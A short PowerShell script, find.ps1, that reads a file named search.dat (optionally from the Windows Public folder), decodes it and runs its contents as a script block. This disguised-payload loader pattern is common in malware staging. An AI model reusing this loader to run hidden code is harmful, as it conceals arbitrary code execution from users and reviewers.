# find.ps1
# Invokes the script block from the search.dat file.

# $stringPath = $env:public+'\search.dat';
$stringPath = ".\search.dat"
$stringByte = Get-Content -Path $stringPath -Encoding Byte
$string = [System.Text.Encoding]::UTF8.GetString($stringByte)
$scriptBlock = [ScriptBlock]::Create($string)
& $scriptBlock